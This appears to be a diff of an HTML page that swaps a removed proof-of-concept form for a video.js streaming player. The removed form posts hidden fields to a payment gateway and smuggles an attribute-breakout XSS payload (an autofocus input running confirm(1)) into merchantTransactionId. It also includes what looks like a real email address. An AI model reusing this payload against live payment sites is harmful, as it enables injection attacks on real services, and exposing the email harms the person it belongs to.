@@ -1,30 +1,22 @@
 <html>
+  <head>
+    <link
+      href="https://cdnjs.cloudflare.com/ajax/libs/video.js/7.10.2/video-js.min.css"
+      rel="stylesheet"
+    />
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/video.js/7.10.2/video.min.js"></script>
+  </head>
   <body>
-  <script>history.pushState('', '', '/')</script>
-    <form action="https://securepay.healthkart.com/gateway/request" method="POST">
-      <input type="hidden" name="country" value="IND" />
-      <input type="hidden" name="amount" value="409" />
-      <input type="hidden" name="address" value="safsdf&#32;34&#32;" />
-      <input type="hidden" name="city" value="CHANDIGARH" />
-      <input type="hidden" name="payment&#95;option" value="PG670" />
-      <input type="hidden" name="description" value="ONLINE&#32;TRANSACTION" />
-      <input type="hidden" name="account&#95;id" value="102588" />
-      <input type="hidden" name="phone" value="9999999999" />
-      <input type="hidden" name="marketplacePayment" value="false" />
-      <input type="hidden" name="secure&#95;hash" value="18AC29E207AC0F753098CFC5B3011C14" />
-      <input type="hidden" name="name" value="saas&#32;asdas" />
-      <input type="hidden" name="mobileDevice" value="0" />
-      <input type="hidden" name="merchantTransactionId" value='xsssjkjbkj"><input type="text" only=1 onfocus="confirm(1)" autofocus value="JohnDoe' />
-      <input type="hidden" name="return&#95;url" value="https://www.truebasics.com/gateway/response/1/102588/1/14392188/false&state=CHANDIGARH&postal_code=160022&email=yasharma5229%40gmail.com&reference_no=22&issuerCode=PG670" />
-      <input type="hidden" name="state" value="CHANDIGARH" />
-      <input type="hidden" name="postal&#95;code" value="160022" />
-      <input type="hidden" name="email" value="user&#64;gmail&#46;com" />
-      <input type="hidden" name="reference&#95;no" value="22" />
-      <input type="hidden" name="issuerCode" value="PG670" />
-      <input type="submit" value="Submit request" />
-    </form>
+    <video-js id="vid1" controls preload="auto">
+      <source
+        src="https://customer-igv9pjegnddatwdj.cloudflarestream.com/08acb3efdef9464b90586ac1e280ebe6/manifest/video.m3u8"
+        type="application/x-mpegURL"
+      />
+    </video-js>
+
     <script>
-     
+      const vid = document.getElementById('vid1');
+      const player = videojs(vid);
     </script>
   </body>
 </html>
